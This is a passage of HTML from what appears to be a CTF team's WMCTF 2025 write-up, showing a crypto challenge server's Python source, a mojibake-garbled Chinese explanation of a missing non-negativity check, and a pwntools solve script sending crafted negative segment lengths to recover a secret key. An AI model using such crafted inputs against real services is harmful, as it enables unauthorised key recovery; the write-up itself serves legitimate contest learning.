</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=nb>abs</span><span class=p>(</span><span class=n>indices</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=n>indices</span><span class=p>[</span><span class=n>j</span><span class=p>])</span> <span class=o>&lt;=</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>valid</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=ow>not</span> <span class=n>valid</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>valid</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=mi>0</span> <span class=ow>in</span> <span class=n>indices</span> <span class=ow>and</span> <span class=p>(</span><span class=n>n</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=ow>in</span> <span class=n>indices</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=n>segment_bits</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>&gt;=</span><span class=mi>25</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>indices</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            <span class=n>found_combination</span> <span class=o>=</span> <span class=n>indices</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>found_combination</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>found_combination</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;no&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>binary_str</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=n>B_decimal</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>512</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>binary_str</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>512</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;no&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>segments_binary</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>start</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>bits</span> <span class=ow>in</span> <span class=n>segment_bits</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>end</span> <span class=o>=</span> <span class=n>start</span> <span class=o>+</span> <span class=n>bits</span>
</span></span><span class=line><span class=cl>        <span class=n>segments_binary</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>binary_str</span><span class=p>[</span><span class=n>start</span><span class=p>:</span><span class=n>end</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>start</span> <span class=o>=</span> <span class=n>end</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>segments_decimal</span> <span class=o>=</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>segment</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span> <span class=k>for</span> <span class=n>segment</span> <span class=ow>in</span> <span class=n>segments_binary</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span><span class=n>segments_decimal</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>found_combination</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Task</span><span class=p>(</span><span class=n>socketserver</span><span class=o>.</span><span class=n>BaseRequestHandler</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_recvall</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>BUFF_SIZE</span> <span class=o>=</span> <span class=mi>2048</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>part</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>BUFF_SIZE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>+=</span> <span class=n>part</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>part</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>BUFF_SIZE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>data</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>send</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>msg</span><span class=p>,</span> <span class=n>newline</span><span class=o>=</span><span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>newline</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>msg</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>recv</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>prompt</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;[-] &#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=n>newline</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>_recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>handle</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># è®¾ç½®socketè¶…æ—¶è€Œä¸æ˜¯ä½¿ç”¨signal.alarm</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>settimeout</span><span class=p>(</span><span class=mi>90</span><span class=p>)</span>  <span class=c1># 90ç§’è¶…æ—¶</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;WMCTF</span><span class=si>{test}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Welcome to WMCTF2025&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>key</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>512</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>q</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>512</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;q:&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>q</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>20</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>a</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>512</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>b</span> <span class=o>=</span> <span class=n>a</span> <span class=o>*</span> <span class=n>key</span> <span class=o>%</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>                <span class=n>gift</span> <span class=o>=</span> <span class=n>split_master</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=nb>list</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>int</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>())))</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;a:&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>a</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;gift:&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>gift</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;the key to the flag is: &#34;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>x</span> <span class=o>==</span> <span class=nb>str</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>socket</span><span class=o>.</span><span class=n>timeout</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Time&#39;s up!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>  <span class=c1># ç¡®ä¿è¿æ¥è¢«å…³é—­</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ThreadedServer</span><span class=p>(</span><span class=n>socketserver</span><span class=o>.</span><span class=n>ThreadingMixIn</span><span class=p>,</span> <span class=n>socketserver</span><span class=o>.</span><span class=n>TCPServer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>HOST</span><span class=p>,</span> <span class=n>PORT</span> <span class=o>=</span> <span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=mi>10003</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;HOST:POST &#34;</span> <span class=o>+</span> <span class=n>HOST</span> <span class=o>+</span> <span class=s2>&#34;:&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>PORT</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>server</span> <span class=o>=</span> <span class=n>ThreadedServer</span><span class=p>((</span><span class=n>HOST</span><span class=p>,</span> <span class=n>PORT</span><span class=p>),</span> <span class=n>Task</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>server</span><span class=o>.</span><span class=n>allow_reuse_address</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=n>server</span><span class=o>.</span><span class=n>serve_forever</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>ä»£ç å¤ªé•¿è€Œä¸”æœ‰ç‚¹å¤æ‚ï¼Œè®©DeepSeekç®€å•åˆ†æä¸€ä¸‹å¯ä»¥çŸ¥é“å‡½æ•° <code>split_master</code> çš„ä¸»è¦åŠŸèƒ½æ˜¯å¤„ç†ä¸€ä¸ªåè¿›åˆ¶æ•° <code>B_decimal</code>ï¼Œå°†å…¶è½¬æ¢ä¸º 512 ä½çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¹¶è¿›è¡Œå¦‚ä¸‹æ£€æŸ¥ï¼š</p><ul><li>æ£€æŸ¥ <code>segment_bits</code> åˆ—è¡¨çš„é•¿åº¦æ˜¯å¦è‡³å°‘ä¸º 3ï¼Œå¦‚æœä¸æ˜¯ï¼ŒæŠ›å‡º <code>ValueError</code> å¼‚å¸¸ï¼Œæ¶ˆæ¯ä¸º &ldquo;no&rdquo;ã€‚</li><li>æ£€æŸ¥ <code>segment_bits</code> ä¸­æ‰€æœ‰ä½é•¿åº¦ä¹‹å’Œæ˜¯å¦æ°å¥½ä¸º 512ï¼Œå¦‚æœä¸æ˜¯ï¼ŒæŠ›å‡º <code>ValueError</code> å¼‚å¸¸ï¼Œæ¶ˆæ¯ä¸º &ldquo;no&rdquo;ã€‚</li></ul><p>ç„¶åæ ¹æ®æä¾›çš„ <code>segment_bits</code> åˆ—è¡¨ï¼ˆæŒ‡å®šå„æ®µçš„ä½é•¿åº¦ï¼‰åˆ†å‰²è¯¥å­—ç¬¦ä¸²ï¼Œå¹¶é€‰æ‹©æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„æ®µç»„åˆï¼Œå®ƒä¼šå°è¯•ä» <code>segment_bits</code> çš„ç´¢å¼•ä¸­é€‰æ‹©ä¸€ä¸ªå­é›†ï¼Œæ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>æ‰€é€‰ç´¢å¼•å¯¹åº”çš„æ®µä½é•¿åº¦ä¹‹å’Œä¸è¶…è¿‡ 30ã€‚</li><li>æ‰€é€‰ç´¢å¼•ä¸èƒ½ç›¸é‚»ï¼ˆå³ä»»æ„ä¸¤ä¸ªç´¢å¼•çš„å·®å€¼ä¸èƒ½ä¸º 1ï¼‰ã€‚</li><li>ä¸èƒ½åŒæ—¶é€‰æ‹©ç¬¬ä¸€ä¸ªç´¢å¼•ï¼ˆ0ï¼‰å’Œæœ€åä¸€ä¸ªç´¢å¼•ï¼ˆå³åˆ—è¡¨çš„æœ€åä¸€ä¸ªç´¢å¼•ï¼‰ã€‚</li><li>æ¯ä¸ªæ‰€é€‰æ®µçš„ä½é•¿åº¦å¿…é¡»å°äº 25ï¼ˆå³ <code>segment_bits[i] &lt; 25</code>ï¼‰ã€‚</li></ul><p>æœ€åæœç´¢ä»æœ€å¤§å¯èƒ½çš„ç»„åˆå¤§å°ï¼ˆå³å°½å¯èƒ½å¤šçš„æ®µï¼‰å¼€å§‹ï¼Œé€æ­¥å‡å°ç»„åˆå¤§å°ï¼Œç›´åˆ°æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ç»„åˆã€‚å¦‚æœæ‰¾ä¸åˆ°ï¼ŒæŠ›å‡º <code>ValueError</code> å¼‚å¸¸ï¼Œæ¶ˆæ¯ä¸º &ldquo;no&rdquo;ï¼Œæœ€åæ ¹æ®é€‰å‡ºçš„å­é›†å¯¹<code>B_decimal</code>è½¬æ¢æˆçš„äºŒè¿›åˆ¶ä¸²è¿›è¡Œåˆ†å‰².</p><p>å› ä¸ºå®ƒæ²¡å¯¹<code>segment_bits</code> çš„å…ƒç´ è¿›è¡Œéè´Ÿæ€§æ£€éªŒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å‘å…¶ä¸­ä¼ å…¥è´Ÿæ•°ï¼Œæ ¹æ®åˆ†æï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥<code>-3 1 1 513</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾—åˆ° $b$ çš„é«˜509ä½ä»¥åŠç¬¬äºŒä½ï¼Œè·å–20ç»„æ•°æ®ä¹‹åæˆ‘ä»¬å–å‡ºå‰ä¸¤ç»„æ•°æ®ï¼Œå†çˆ†ç ´è¿™ä¸¤ç»„æ•°æ®ä¸­ $b$ æœªçŸ¥çš„ä¸¤ä½ï¼ˆä¸€å…±å››ä½ï¼‰ï¼Œå¹¶åˆ†åˆ«è®¡ç®—$key \equiv a^{-1} b \pmod{q}$ï¼Œåˆ¤æ–­è®¡ç®—å‡ºçš„ $ke$ æ˜¯å¦ç›¸åŒå³å¯.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sage.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>product</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>success</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] </span><span class=si>{</span><span class=n>s</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;62.234.144.69&#34;</span><span class=p>,</span> <span class=mi>31737</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;q:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>q</span> <span class=si>= }</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>20</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;-3 1 1 513&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;a:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;gift:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>g0</span><span class=p>,</span> <span class=n>g1</span> <span class=o>=</span> <span class=nb>map</span><span class=p>(</span><span class=nb>int</span><span class=p>,</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()[</span><span class=mi>1</span><span class=p>:</span> <span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>gift</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>g0</span><span class=p>,</span> <span class=n>g1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>binlist</span> <span class=ow>in</span> <span class=n>product</span><span class=p>([</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>],</span> <span class=n>repeat</span><span class=o>=</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>b0</span><span class=p>,</span> <span class=n>b1</span><span class=p>,</span> <span class=n>b2</span><span class=p>,</span> <span class=n>b3</span> <span class=o>=</span> <span class=n>binlist</span>
</span></span><span class=line><span class=cl>    <span class=n>B0</span> <span class=o>=</span> <span class=p>(</span><span class=n>gift</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>b0</span> <span class=o>&lt;&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>gift</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>b1</span>
</span></span><span class=line><span class=cl>    <span class=n>B1</span> <span class=o>=</span> <span class=p>(</span><span class=n>gift</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>b2</span> <span class=o>&lt;&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>gift</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>b3</span>
</span></span><span class=line><span class=cl>    <span class=n>key1</span> <span class=o>=</span> <span class=n>B0</span> <span class=o>*</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>q</span><span class=p>)</span> <span class=o>%</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>    <span class=n>key2</span> <span class=o>=</span> <span class=n>B1</span> <span class=o>*</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>q</span><span class=p>)</span> <span class=o>%</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>key1</span> <span class=o>==</span> <span class=n>key2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>key1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/wmctf/>WMCTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/wmctf-2023-su-wu/>2023 WMCTF SU Write-Up</a></li><li><a href=/post/wmctf-2020-su-wu/>WMCTF 2020 SU Write-Up</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/tfcctf-2025-su-wu/ data-toggle=tooltip data-placement=top title="2025 TFCCTF SU WriteUp">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/ntfy-2025-su-wu/ data-toggle=tooltip data-placement=top title="ç¬¬å…«å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€é˜²å¾¡å›½é™…ç²¾è‹±æŒ‘æˆ˜èµ› SU Writeup">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script 